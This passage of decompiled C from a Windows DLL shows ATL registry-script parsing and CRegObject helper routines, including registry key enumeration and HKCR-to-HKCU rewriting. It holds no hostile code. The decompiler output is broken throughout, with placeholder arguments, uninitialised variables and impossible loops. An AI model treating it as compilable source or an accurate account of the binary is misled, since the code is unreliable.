                *(int16_t *)v7 = 0;
                return 0;
            }
        }
        // 0x100112bb
        int32_t v8; // 0x100111c0
        int32_t v9 = v8; // 0x100112a0
        v5 -= 4;
        *(int32_t *)v5 = v9;
        int32_t v10 = (int32_t)CharNextW((int16_t *)&g173); // 0x100112bc
        *(int32_t *)v1 = v10;
        int32_t v11 = v10 - v9; // 0x100112c7
        int32_t v12 = v6 + 2;
        int32_t v13 = v12 + (v11 & -2); // 0x100112cb
        v3 = v13;
        while (v13 < a1 + 0x2000) {
            int16_t v14 = v13; // 0x100112db
            int32_t v15 = v6; // 0x100112db
            if (v11 >= 2) {
                int32_t v16 = v9 - v6; // 0x100112dd
                uint16_t v17 = *(int16_t *)v9; // 0x100112e0
                v3 = v13 & -0x10000 | (int32_t)v17;
                *(int16_t *)v6 = v17;
                int32_t v18 = v11 / 2 - 1; // 0x100112ea
                int32_t v19 = v18; // 0x100112eb
                int32_t v20 = v12; // 0x100112eb
                int32_t v21 = v12; // 0x100112eb
                if (v18 != 0) {
                    uint16_t v22 = *(int16_t *)(v16 + v20); // 0x100112e0
                    v3 = v3 & -0x10000 | (int32_t)v22;
                    *(int16_t *)v20 = v22;
                    int32_t v23 = v20 + 2; // 0x100112e7
                    int32_t v24 = v19 - 1; // 0x100112ea
                    v19 = v24;
                    v20 = v23;
                    v21 = v23;
                    while (v24 != 0) {
                        // 0x100112e0
                        v22 = *(int16_t *)(v16 + v20);
                        v3 = v3 & -0x10000 | (int32_t)v22;
                        *(int16_t *)v20 = v22;
                        v23 = v20 + 2;
                        v24 = v19 - 1;
                        v19 = v24;
                        v20 = v23;
                        v21 = v23;
                    }
                }
                // 0x100112ed
                v14 = *(int16_t *)&v3;
                v15 = v21;
            }
            // 0x100112ed
            if (v14 == 0) {
                // break -> 0x100112f6
                break;
            }
            // 0x100112ed
            v6 = v15;
            g159 = v14;
            v7 = v6;
            switch (v14) {
                case 0: {
                }
                case 3: {
                }
                case 4: {
                }
                case 7: {
                    // 0x100112f6
                    *(int16_t *)v7 = 0;
                    return 0;
                }
            }
            // 0x100112bb
            v9 = v3;
            v5 -= 4;
            *(int32_t *)v5 = v9;
            v10 = (int32_t)CharNextW((int16_t *)&g173);
            *(int32_t *)v1 = v10;
            v11 = v10 - v9;
            v12 = v6 + 2;
            v13 = v12 + (v11 & -2);
            v3 = v13;
        }
        // 0x100111d7
        return -0x7ffdfff7;
    }
    int16_t * lpsz = (int16_t *)v1; // 0x100111fd
    int16_t * v25 = lpsz; // bp-20, 0x100111fd
    int32_t v26 = (int32_t)&v25; // 0x100111fd
    int16_t * v27 = CharNextW(lpsz); // 0x100111fe
    v3 = 0;
    int32_t * v28 = (int32_t *)v1; // 0x10011202
    *v28 = (int32_t)v27;
    int32_t v29; // 0x100111c0
    int32_t v30; // 0x100111c0
    if (*v27 == 0) {
        // 0x1001127c
        v30 = v26;
        v29 = a1;
        if (*(int16_t *)&v3 == 0) {
            // 0x100111d7
            return -0x7ffdfff7;
        }
      lab_0x10011285:
        // 0x10011285
        *(int16_t *)v29 = 0;
        *(int32_t *)(v30 - 4) = v3;
        *v28 = (int32_t)CharNextW((int16_t *)&g173);
        return 0;
    }
    int32_t v31 = a1;
    int32_t v32 = v26; // 0x10011213
    int32_t v33; // 0x10011215
    int16_t * v34; // 0x10011216
    if (*(int16_t *)&v3 == 39) {
        // 0x10011215
        v33 = v26 - 4;
        *(int32_t *)v33 = v3;
        v34 = CharNextW((int16_t *)&g173);
        v3 = 39;
        v30 = v33;
        v29 = v31;
        if (*v34 != 39) {
            goto lab_0x10011285;
        }
        // 0x1001122e
        v32 = v26 - 8;
        *(int32_t *)v32 = 39;
        *v28 = (int32_t)CharNextW((int16_t *)&g173);
    }
    int32_t v35 = v3; // 0x10011233
    int32_t v36 = v32 - 4; // 0x10011235
    *(int32_t *)v36 = v35;
    int32_t v37 = (int32_t)CharNextW((int16_t *)&g173); // 0x10011236
    *v28 = v37;
    int32_t v38 = v37 - v35; // 0x10011241
    int32_t v39 = v31 + 2;
    int32_t v40 = v39 + (v38 & -2); // 0x10011245
    v3 = v40;
    while (v40 < a1 + 0x2000) {
        int16_t v41 = v40; // 0x10011259
        int32_t v42 = v31; // 0x10011259
        if (v38 >= 2) {
            int32_t v43 = v35 - v31; // 0x1001125b
            uint16_t v44 = *(int16_t *)v35; // 0x10011260
            v3 = v40 & -0x10000 | (int32_t)v44;
            *(int16_t *)v31 = v44;
            int32_t v45 = v38 / 2 - 1; // 0x1001126a
            int32_t v46 = v45; // 0x1001126b
            int32_t v47 = v39; // 0x1001126b
            int32_t v48 = v39; // 0x1001126b
            if (v45 != 0) {
                uint16_t v49 = *(int16_t *)(v43 + v47); // 0x10011260
                v3 = v3 & -0x10000 | (int32_t)v49;
                *(int16_t *)v47 = v49;
                int32_t v50 = v47 + 2; // 0x10011267
                int32_t v51 = v46 - 1; // 0x1001126a
                v46 = v51;
                v47 = v50;
                v48 = v50;
                while (v51 != 0) {
                    // 0x10011260
                    v49 = *(int16_t *)(v43 + v47);
                    v3 = v3 & -0x10000 | (int32_t)v49;
                    *(int16_t *)v47 = v49;
                    v50 = v47 + 2;
                    v51 = v46 - 1;
                    v46 = v51;
                    v47 = v50;
                    v48 = v50;
                }
            }
            // 0x1001126d
            v41 = *(int16_t *)&v3;
            v42 = v48;
        }
        // 0x1001126d
        if (v41 == 0) {
            // break -> 0x100111d7
            break;
        }
        int32_t v52 = v36;
        v31 = v42;
        v32 = v52;
        if (v41 == 39) {
            // 0x10011215
            v33 = v52 - 4;
            *(int32_t *)v33 = v3;
            v34 = CharNextW((int16_t *)&g173);
            v3 = 39;
            v30 = v33;
            v29 = v31;
            if (*v34 != 39) {
                goto lab_0x10011285;
            }
            // 0x1001122e
            v32 = v52 - 8;
            *(int32_t *)v32 = 39;
            *v28 = (int32_t)CharNextW((int16_t *)&g173);
        }
        // 0x10011233
        v35 = v3;
        v36 = v32 - 4;
        *(int32_t *)v36 = v35;
        v37 = (int32_t)CharNextW((int16_t *)&g173);
        *v28 = v37;
        v38 = v37 - v35;
        v39 = v31 + 2;
        v40 = v39 + (v38 & -2);
        v3 = v40;
    }
    // 0x100111d7
    return -0x7ffdfff7;
}

// Address range: 0x10011330 - 0x1001136e
int32_t function_10011330(int32_t a1) {
    // 0x10011330
    int32_t v1; // bp-16, 0x10011330
    int32_t v2 = &v1; // 0x1001133f
    int32_t v3 = &g10; // 0x1001133f
    *(int32_t *)(v2 - 4) = *(int32_t *)v3;
    v2 -= 8;
    *(int32_t *)v2 = a1;
    int32_t v4 = lstrcmpiW((int16_t *)&g173, (int16_t *)&g173); // 0x10011348
    int32_t result = 0; // 0x1001134c
    while (v4 != 0) {
        // 0x1001134e
        v3 += 4;
        result = 1;
        if (v3 >= (int32_t)"RegOpenKeyTransactedW") {
            // break -> 0x10011359
            break;
        }
        *(int32_t *)(v2 - 4) = *(int32_t *)v3;
        v2 -= 8;
        *(int32_t *)v2 = a1;
        v4 = lstrcmpiW((int16_t *)&g173, (int16_t *)&g173);
        result = 0;
    }
    // 0x10011359
    return result;
}

// Address range: 0x10011370 - 0x100113b8
int32_t function_10011370(int32_t hKey) {
    int32_t lpcSubKeys = 0; // bp-8, 0x10011390
    int32_t v1 = RegQueryInfoKeyW((int32_t *)hKey, NULL, NULL, NULL, &lpcSubKeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL); // 0x10011397
    if (v1 == 0) {
        // 0x100113a9
        return lpcSubKeys != 0;
    }
    // 0x100113a1
    return 0;
}

// Address range: 0x100113c0 - 0x10011427
int32_t function_100113c0(int32_t a1) {
    // 0x100113c0
    __chkstk();
    if (*(int16_t *)a1 != 61 || function_100111c0(a1) < 0) {
        // 0x10011415
        return _40___security_check_cookie_40_4();
    }
    // 0x100113ee
    function_10011160();
    int32_t v1; // bp-8200, 0x100113c0
    if (function_100111c0((int32_t)&v1) >= 0) {
        // 0x10011407
        function_100111c0(a1);
    }
    // 0x10011415
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10011430 - 0x10011433
int32_t function_10011430(void) {
    // 0x10011430
    return 0;
}

// Address range: 0x10011440 - 0x10011443
int32_t function_10011440(void) {
    // 0x10011440
    int32_t result; // 0x10011440
    return result;
}

// Address range: 0x10011450 - 0x1001145a
void function_10011450(int16_t * bstrString) {
    // 0x10011450
    SysFreeString(bstrString);
}

// Address range: 0x10011460 - 0x10011465
// From class:    .?AV?$CComContainedObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10011460(void) {
    // 0x10011460
    return 0;
}

// Address range: 0x10011470 - 0x10011482
// From class:    .?AV?$CComContainedObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10011470(int32_t a1) {
    // 0x10011470
    *(int32_t *)a1 = 0;
    return 0;
}

// Address range: 0x10011490 - 0x10011498
// From class:    .?AV?$CComContainedObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10011490(void) {
    // 0x10011490
    return 1;
}

// Address range: 0x100114a0 - 0x100114be
int32_t function_100114a0(void) {
    // 0x100114a0
    int32_t v1; // 0x100114a0
    if (v1 == 0) {
        // 0x100114bc
        int32_t result; // 0x100114a0
        return result;
    }
    // 0x100114a8
    while (true) {
        // 0x100114a8
        _free(&g173);
    }
}

// Address range: 0x100114c0 - 0x100114ca
int32_t function_100114c0(void) {
    // 0x100114c0
    int32_t v1; // 0x100114c0
    _free((int32_t *)v1);
    return &g173;
}

// Address range: 0x100114d0 - 0x100114f7
int32_t function_100114d0(int32_t a1) {
    int32_t * v1 = _malloc(a1); // 0x100114da
    int32_t result = (int32_t)v1; // 0x100114e4
    if (v1 == NULL) {
        // 0x100114e6
        result = function_100108b0(-0x7ff8fff2);
    }
    // 0x100114f0
    int32_t v2; // 0x100114d0
    *(int32_t *)v2 = result;
    return result;
}

// Address range: 0x10011500 - 0x1001151f
int32_t function_10011500(void) {
    int32_t result = 0; // 0x10011507
    int32_t v1; // 0x10011500
    if (v1 != 0) {
        int32_t * hKey = (int32_t *)v1; // 0x1001150a
        result = RegCloseKey(hKey);
        *hKey = 0;
    }
    // 0x10011516
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x10011520 - 0x1001166d
int32_t function_10011520(int32_t a1) {
    // 0x10011520
    int32_t v1; // 0x10011520
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x1001153b
    if (function_10010d50(v2, a1, v2 || 0x2001f) != 0) {
        // 0x10011585
        return _40___security_check_cookie_40_4();
    }
    int32_t v3 = 0; // bp-604, 0x100115b9
    int32_t v4 = &v3; // 0x100115b9
    int32_t lpcchName = 256; // bp-536, 0x100115ba
    int32_t lpName; // bp-520, 0x10011520
    int32_t lpftLastWriteTime; // bp-548, 0x10011520
    int32_t v5 = RegEnumKeyExW(NULL, 0, (int16_t *)&lpName, &lpcchName, NULL, NULL, NULL, (struct _FILETIME *)&lpftLastWriteTime); // 0x100115c4
    if (v5 != 0) {
        // 0x10011635
        *(int32_t *)(v4 - 4) = a1;
        function_10010c00(0);
        return _40___security_check_cookie_40_4();
    }
    int32_t v6 = &lpName; // 0x100115d6
    int32_t v7 = v4; // 0x10011607
    *(int32_t *)(v7 - 4) = v6;
    while (function_10011520((int32_t)&g173) == 0) {
        // 0x100115e8
        *(int32_t *)(v7 - 8) = (int32_t)&lpftLastWriteTime;
        *(int32_t *)(v7 - 12) = 0;
        *(int32_t *)(v7 - 16) = 0;
        *(int32_t *)(v7 - 20) = 0;
        *(int32_t *)(v7 - 24) = (int32_t)&lpcchName;
        *(int32_t *)(v7 - 28) = v6;
        *(int32_t *)(v7 - 32) = 0;
        v7 -= 36;
        *(int32_t *)v7 = 0;
        lpcchName = 256;
        int32_t v8 = RegEnumKeyExW((int32_t *)256, (int32_t)&g173, (int16_t *)&g173, &g173, &g173, (int16_t *)&g173, &g173, (struct _FILETIME *)&g173); // 0x10011612
        int32_t v9 = v7; // 0x1001161a
        if (v8 != 0) {
            // 0x10011635
            *(int32_t *)(v9 - 4) = a1;
            function_10010c00(0);
            return _40___security_check_cookie_40_4();
        }
        *(int32_t *)(v7 - 4) = v6;
    }
    // 0x10011585
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10011670 - 0x1001176b
int32_t function_10011670(int32_t a1) {
    // 0x10011670
    int32_t v1; // bp-8, 0x10011670
    int32_t v2 = &v1; // 0x10011671
    int32_t v3; // 0x10011670
    int32_t * v4 = (int32_t *)(v3 + 8); // 0x10011676
    int32_t v5 = *v4; // 0x10011676
    int32_t v6; // 0x10011670
    if (v5 < 1) {
      lab_0x100116b1:
        // 0x100116b1
        if (v6 != 0) {
            // 0x100116b7
            *(int32_t *)(v2 - 4) = v6;
            _free(&g173);
            *(int32_t *)v3 = 0;
        }
        int32_t * v7 = (int32_t *)(v3 + 4); // 0x100116c6
        int32_t v8 = *v7; // 0x100116c6
        if (v8 != 0) {
            // 0x100116cd
            *(int32_t *)(v2 - 4) = v8;
            _free(&g173);
            *v7 = 0;
        }
        // 0x100116dd
        *v4 = 0;
        return 0;
    }
    int32_t * v9 = (int32_t *)(v2 - 4);
    uint32_t v10 = v5; // 0x100116ac
    uint32_t v11 = 0;
    while (v11 < v10) {
        int32_t v12 = 4 * v11; // 0x1001168b
        int32_t v13; // 0x10011670
        int32_t v14 = *(int32_t *)(v12 + v13); // 0x1001168b
        *v9 = v14;
        function_1001a6db();
        if (v11 >= *v4) {
            // break -> 0x100116e9
            break;
        }
        // 0x1001169c
        *v9 = *(int32_t *)(*(int32_t *)(v3 + 4) + v12);
        function_1001a6db();
        int32_t v15 = v11 + 1; // 0x100116a8
        v10 = *v4;
        v13 = v14;
        v6 = v14;
        if (v15 >= v10) {
            goto lab_0x100116b1;
        }
        v11 = v15;
    }
    // 0x100116e9
    *v9 = 0;
    *(int32_t *)(v2 - 8) = 0;
    int32_t * v16 = (int32_t *)(v2 - 12); // 0x100116ed
    *v16 = 1;
    *(int32_t *)(v2 - 16) = -0x3fffff74;
    RaiseException((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, &g173);
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    int32_t * v17 = (int32_t *)(v2 - 24); // 0x10011703
    *v17 = -1;
    *(int32_t *)(v2 - 28) = 0x10026538;
    int32_t v18 = __readfsdword(0); // 0x1001170a
    int32_t v19 = v2 - 32; // 0x10011710
    int32_t * v20 = (int32_t *)v19; // 0x10011710
    *v20 = v18;
    *(int32_t *)(v2 - 40) = v11;
    *(int32_t *)(v2 - 44) = g78 ^ v2 - 20;
    __writefsdword(0, v19);
    int32_t v21 = *v16; // 0x10011726
    if (v21 == 0) {
        // 0x1001172f
        __writefsdword(0, *v20);
        return 0;
    }
    // 0x10011742
    *v16 = 0;
    *(int32_t *)(v2 - 48) = v21;
    *v17 = 0;
    *(int32_t *)(v2 - 52) = lstrlenW((int16_t *)&g173);
    *(int32_t *)(v2 - 56) = v21;
    int32_t result = function_10010f00((int32_t)&g173, (int32_t)&g173); // 0x10011753
    __writefsdword(0, *v20);
    return result;
}

// Address range: 0x10011770 - 0x10011782
// From class:    .?AVCRegObject@ATL@@
// Type:          virtual member function
int32_t function_10011770(int32_t a1) {
    // 0x10011770
    int32_t v1; // 0x10011770
    return function_10011670(v1);
}

// Address range: 0x10011790 - 0x100117c8
int32_t function_10011790(void) {
    // 0x10011790
    int32_t v1; // 0x10011790
    if (v1 != 0) {
        int32_t * v2 = (int32_t *)v1; // 0x1001179a
        _free(v2);
        *v2 = 0;
    }
    int32_t * v3 = (int32_t *)(v1 + 4); // 0x100117a8
    int32_t v4 = *v3; // 0x100117a8
    int32_t result = 0; // 0x100117ad
    if (v4 != 0) {
        // 0x100117af
        _free((int32_t *)v4);
        *v3 = 0;
        result = &g173;
    }
    // 0x100117bf
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x100117d0 - 0x10011856
int32_t function_100117d0(int32_t * a1) {
    // 0x100117d0
    int32_t v1; // 0x100117d0
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x100117da
    if (*v2 < 1) {
        // 0x100117fb
        return 0;
    }
    int32_t v3 = 0;
    int32_t v4; // bp-16, 0x100117d0
    int32_t v5 = &v4;
    int32_t v6 = 4 * v3; // 0x100117e6
    int32_t v7; // 0x100117d0
    int32_t v8 = *(int32_t *)(v6 + v7); // 0x100117e6
    *(int32_t *)(v5 - 4) = *a1;
    int32_t v9 = v5 - 8; // 0x100117ea
    *(int32_t *)v9 = v8;
    while (lstrcmpiW((int16_t *)&g173, (int16_t *)&g173) != 0) {
        int32_t v10 = v3 + 1; // 0x100117f5
        if (v10 >= *v2) {
            // 0x100117fb
            return 0;
        }
        v3 = v10;
        v5 = v9;
        v6 = 4 * v3;
        v8 += v6;
        *(int32_t *)(v5 - 4) = *a1;
        v9 = v5 - 8;
        *(int32_t *)v9 = v8;
    }
    // 0x10011816
    if (v3 < *v2) {
        // 0x1001181b
        return *(int32_t *)(*(int32_t *)(v1 + 4) + v6);
    }
    // 0x10011828
    *(int32_t *)(v5 - 12) = 0;
    *(int32_t *)(v5 - 16) = 0;
    *(int32_t *)(v5 - 20) = 1;
    *(int32_t *)(v5 - 24) = -0x3fffff74;
    RaiseException((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, &g173);
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    *(int32_t *)(v5 - 28) = v3;
    int32_t * v11 = (int32_t *)v8; // 0x10011843
    *(int32_t *)(v5 - 32) = *v11;
    int32_t result = function_1001a6db(); // 0x10011846
    *v11 = 0;
    return result;
}

// Address range: 0x10011860 - 0x1001186d
int32_t function_10011860(void) {
    // 0x10011860
    return function_100114c0();
}

// Address range: 0x10011870 - 0x100118dc
int32_t function_10011870(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10011880
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // 0x10011870
    function_10011670(v2);
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)v2; // 0x100118ab
        _free(v3);
        *v3 = 0;
    }
    int32_t * v4 = (int32_t *)(v2 + 4); // 0x100118b5
    int32_t v5 = *v4; // 0x100118b5
    int32_t result = 0; // 0x100118ba
    if (v5 != 0) {
        // 0x100118bc
        _free((int32_t *)v5);
        *v4 = 0;
        result = &g173;
    }
    // 0x100118c8
    *(int32_t *)(v2 + 8) = 0;
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x100118e0 - 0x10011966
// From class:    .?AVCRegObject@ATL@@
// Type:          destructor
int32_t function_100118e0(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x100118f0
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // 0x100118e0
    *(int32_t *)v2 = (int32_t)&g11;
    int32_t v3 = v2 + 4; // 0x1001190e
    function_10011670(v2);
    function_10011670(v3);
    int32_t * v4 = (int32_t *)v3; // 0x1001192e
    int32_t v5 = *v4; // 0x1001192e
    if (v5 != 0) {
        // 0x10011934
        _free((int32_t *)v5);
        *v4 = 0;
    }
    int32_t * v6 = (int32_t *)(v2 + 8); // 0x1001193f
    int32_t v7 = *v6; // 0x1001193f
    int32_t result = 0; // 0x10011944
    if (v7 != 0) {
        // 0x10011946
        _free((int32_t *)v7);
        *v6 = 0;
        result = &g173;
    }
    // 0x10011952
    *(int32_t *)(v2 + 12) = 0;
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10011970 - 0x10011978
// From class:    .?AVCRegObject@ATL@@
// Type:          virtual member function
int32_t function_10011970(void) {
    // 0x10011970
    return -0x7fffbfff;
}

// Address range: 0x10011980 - 0x10011988
// From class:    .?AVCRegObject@ATL@@
// Type:          virtual member function
int32_t function_10011980(void) {
    // 0x10011980
    return 1;
}

// Address range: 0x10011990 - 0x10011995
// From class:    .?AVCRegObject@ATL@@
// Type:          virtual member function
int32_t function_10011990(void) {
    // 0x10011990
    return 0;
}

// Address range: 0x100119a0 - 0x10011a50
// From class:    .?AVCRegObject@ATL@@
// Type:          constructor
int32_t function_100119a0(char a1) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x100119b0
    __writefsdword(0, (int32_t)&v1);
    int32_t result; // 0x100119a0
    *(int32_t *)result = (int32_t)&g11;
    int32_t v2 = result + 4; // 0x100119d0
    function_10011670(result);
    function_10011670(v2);
    int32_t * v3 = (int32_t *)v2; // 0x100119f2
    int32_t v4 = *v3; // 0x100119f2
    if (v4 != 0) {
        // 0x100119ff
        _free((int32_t *)v4);
        *v3 = 0;
    }
    int32_t * v5 = (int32_t *)(result + 8); // 0x10011a0e
    int32_t v6 = *v5; // 0x10011a0e
    if (v6 != 0) {
        // 0x10011a15
        _free((int32_t *)v6);
        *v5 = 0;
    }
    // 0x10011a25
    *(int32_t *)(result + 12) = 0;
    if ((a1 & 1) != 0) {
        // 0x10011a32
        _3f__3f_3_40_YAXPAX_40_Z(&g173);
    }
    // 0x10011a3b
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10011a50 - 0x10011d12
int32_t function_10011a50(int32_t a1, int32_t a2) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10011a60
    __writefsdword(0, (int32_t)&v1);
    if (a1 == 0 || a2 == 0) {
        // 0x10011cf4
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    int32_t lpString = a1; // bp-140, 0x10011a96
    int32_t * v2 = (int32_t *)a2; // 0x10011a97
    *v2 = 0;
    int32_t v3 = 2 * lstrlenW((int16_t *)lpString); // 0x10011aa3
    uint32_t v4 = v3 > 99 ? v3 : 1000;
    int32_t v5 = v4 / 0x80000000; // 0x10011ab1
    int32_t v6 = v5; // 0x10011ab1
    int32_t v7 = 0; // bp-112, 0x10011abc
    int16_t v8; // 0x10011a50
    int32_t v9; // 0x10011a50
    int32_t v10; // 0x10011a50
    int32_t v11; // 0x10011a50
    int32_t v12; // 0x10011a50
    int32_t v13; // 0x10011a50
    int32_t v14; // 0x10011a50
    int32_t v15; // 0x10011a50
    int32_t v16; // 0x10011a50
    int32_t v17; // 0x10011a50
    int32_t v18; // 0x10011a50
    int32_t v19; // bp-120, 0x10011a50
    char v20; // 0x10011a50
    char v21; // 0x10011a50
    char v22; // 0x10011a50
    char v23; // 0x10011a50
    char v24; // 0x10011a50
    char v25; // 0x10011a50
    char v26; // 0x10011a50
    int32_t v27; // 0x10011acd
    int32_t * v28; // 0x10011af9
    int32_t v29; // 0x10011a50
    int32_t v30; // 0x10011a50
    int32_t v31; // 0x10011a50
    if (v5 == 0) {
        int32_t v32 = 2 * v4; // 0x10011aba
        int32_t v33 = v32; // bp-144, 0x10011acc
        int32_t * v34 = CoTaskMemAlloc(v32); // 0x10011acd
        int32_t v35 = &v33;
        v9 = v35;
        if (v34 != NULL) {
            // 0x10011af9
            v27 = (int32_t)v34;
            v6 = 0;
            *(int16_t *)v34 = 0;
            int32_t v36; // 0x10011a50
            v28 = (int32_t *)v36;
            *v28 = a1;
            v15 = v35;
            if (*(int16_t *)a1 == 0) {
              lab_0x10011c99:
                // 0x10011c99
                *(int32_t *)(v15 - 4) = 0;
                *v2 = v27;
                CoTaskMemFree(NULL);
                // 0x10011cf4
                __writefsdword(0, v1);
                return _40___security_check_cookie_40_4();
            }
            // 0x10011b20
            v29 = &v7;
            int32_t v37; // bp-84, 0x10011a50
            v30 = &v37;
            v31 = &v19;
            v16 = 0;
            v24 = 0;
            v20 = 0;
            v11 = v35;
            while (true) {
              lab_0x10011b20:;
                int32_t v38 = v11;
                v21 = v20;
                char v39 = v24;
                v17 = v16;
                v18 = v17;
                v26 = v39;
                v23 = v21;
                v14 = v38;
                if (g93 != 1) {
                    goto lab_0x10011bf6;
                } else {
                    char v40 = v39; // 0x10011b2e
                    int32_t v41 = v38; // 0x10011b2e
                    if (v17 == 0) {
                        int32_t * v42 = (int32_t *)(v38 - 4); // 0x10011b32
                        *v42 = (int32_t)L"HKCR";
                        int32_t * v43 = (int32_t *)(v38 - 8); // 0x10011b37
                        *v43 = v6;
                        int16_t * v44 = _wcsstr((int16_t *)&g173, (int16_t *)&g173); // 0x10011b38
                        v40 = v39;
                        v41 = v38;
                        if (v44 != NULL) {
                            int32_t v45 = v6; // 0x10011b44
                            v40 = v39;
                            v41 = v38;
                            if (v45 == (int32_t)v44) {
                                // 0x10011b4a
                                *v42 = v45;
                                int32_t v46 = (int32_t)CharNextW((int16_t *)&g173); // 0x10011b4b
                                *v43 = v46;
                                *v28 = v46;
                                int32_t v47 = (int32_t)CharNextW((int16_t *)&g173); // 0x10011b50
                                *(int32_t *)(v38 - 12) = v47;
                                *v28 = v47;
                                int32_t v48 = (int32_t)CharNextW((int16_t *)&g173); // 0x10011b55
                                *(int32_t *)(v38 - 16) = v48;
                                *v28 = v48;
                                int16_t * v49 = CharNextW((int16_t *)&g173); // 0x10011b5a
                                int32_t v50 = v38 - 20; // 0x10011b5c
                                *(int32_t *)v50 = (int32_t)L"HKCU\r\n{\tSoftware\r\n\t{\r\n\t\tClasses";
                                v6 = v29;
                                *v28 = (int32_t)v49;
                                v40 = 1;
                                v41 = v50;
                                v10 = v50;
                                if (v49 == NULL) {
                                    // break -> 0x10011cad
                                    break;
                                }
                            }
                        }
                    }
                    int32_t v51 = v41;
                    v25 = v40;
                    v12 = v51;
                    if (*(int16_t *)&v6 != 39) {
                        goto lab_0x10011bba;
                    } else {
                        // 0x10011b83
                        v18 = v17;
                        v26 = v25;
                        v23 = 1;
                        v14 = v51;
                        if (v21 != 0) {
                            // 0x10011b8f
                            v8 = v36;
                            v22 = 0;
                            v13 = v51;
                            if (function_10010ec0() == 0) {
                                int32_t v52 = (int32_t)CharNextW((int16_t *)&g173); // 0x10011ba3
                                *(int32_t *)(v51 - 8) = 1;
                                int32_t v53 = v51 - 12; // 0x10011ba7
                                *(int32_t *)v53 = v52;
                                v6 = v29;
                                *v28 = v52;
                                int32_t v54 = function_10010f00((int32_t)&g173, (int32_t)&g173); // 0x10011bad
                                v12 = v53;
                                v10 = v53;
                                if (v54 == 0) {
                                    // break -> 0x10011cad
                                    break;
                                }
                                goto lab_0x10011bba;
                            } else {
                                goto lab_0x10011bc0;
                            }
                        } else {
                            goto lab_0x10011bf6;
                        }
                    }
                }
            }
          lab_0x10011cad_2:
            // 0x10011cad
            *(int32_t *)(v10 - 4) = v27;
            CoTaskMemFree((int32_t *)-0x7ff8fff2);
          lab_0x10011cf4:
            // 0x10011cf4
            __writefsdword(0, v1);
            return _40___security_check_cookie_40_4();
        }
    } else {
        // 0x10011ad5
        v9 = &lpString;
    }
    // 0x10011ae8
    *(int32_t *)(v9 - 4) = 0;
    CoTaskMemFree(NULL);
    // 0x10011cf4
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
  lab_0x10011cc3_2:;
    // 0x10011cc3
    int32_t v55; // 0x10011a50
    *(int32_t *)(v55 - 4) = v27;
    CoTaskMemFree((int32_t *)-0x7ffdfff7);
    goto lab_0x10011cf4;
  lab_0x10011bf6:;
    int32_t v56 = v14;
    int32_t v57 = v6; // 0x10011bf6
    int32_t v58 = v57; // 0x10011bfc
    int32_t v59 = v56; // 0x10011bfc
    int32_t v60; // 0x10011a50
    if ((int16_t)v57 != 37) {
        goto lab_0x10011c74;
    } else {
        int32_t v61 = v56 - 4; // 0x10011bfe
        *(int32_t *)v61 = v57;
        int16_t * v62 = CharNextW((int16_t *)&g173); // 0x10011bff
        int32_t v63 = (int32_t)v62; // 0x10011bff
        *v28 = v63;
        v58 = v63;
        v59 = v61;
        if (*v62 == 37) {
            goto lab_0x10011c74;
        } else {
            int32_t v64 = v56 - 8; // 0x10011c09
            int32_t * v65 = (int32_t *)v64;
            *v65 = 37;
            int32_t v66 = v56 - 12; // 0x10011c0b
            int32_t * v67 = (int32_t *)v66; // 0x10011c0b
            *v67 = v63;
            int32_t v68 = function_10011110((int32_t)&g173, (int32_t)&g173); // 0x10011c0c
            v55 = v61;
            if (v68 == 0) {
                goto lab_0x10011cc3_2;
            }
            int32_t v69 = v68 - v6; // 0x10011c20
            if (v69 > 63) {
                // 0x10011cd9
                *v65 = v27;
                CoTaskMemFree((int32_t *)-0x7fffbffb);
                goto lab_0x10011cf4;
            }
            // 0x10011c2d
            *v65 = v69 / 2;
            *v67 = v6;
            *(int32_t *)(v56 - 16) = 32;
            *(int32_t *)(v56 - 20) = v30;
            function_10010990((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
            v19 = v30;
            *v65 = v31;
            int32_t v70 = function_100117d0((int32_t *)v19); // 0x10011c4d
            v55 = v64;
            if (v70 == 0) {
                goto lab_0x10011cc3_2;
            }
            // 0x10011c56
            *v67 = v70;
            v6 = v29;
            v60 = v66;
            if (v68 != v29) {
                int32_t v71; // 0x10011a50
                int32_t v72 = v71 - 4; // 0x10011c69
                int32_t v73; // 0x10011a50
                *(int32_t *)v72 = v73;
                int32_t v74 = (int32_t)CharNextW((int16_t *)&g173); // 0x10011c6a
                *v28 = v74;
                v73 = v6;
                v71 = v72;
                v60 = v72;
                while (v68 != v74) {
                    int32_t v75 = v71;
                    int32_t v76 = v73; // 0x10011c67
                    v72 = v75 - 4;
                    *(int32_t *)v72 = v76;
                    int16_t * v77 = CharNextW((int16_t *)&g173); // 0x10011c6a
                    v74 = (int32_t)v77;
                    *v28 = v74;
                    int32_t v78 = v6;
                    v73 = v78;
                    v71 = v72;
                    v60 = v72;
                }
            }
            goto lab_0x10011c83;
        }
    }
  lab_0x10011c74:
    // 0x10011c74
    *(int32_t *)(v59 - 4) = 1;
    int32_t v79 = v59 - 8; // 0x10011c76
    *(int32_t *)v79 = v58;
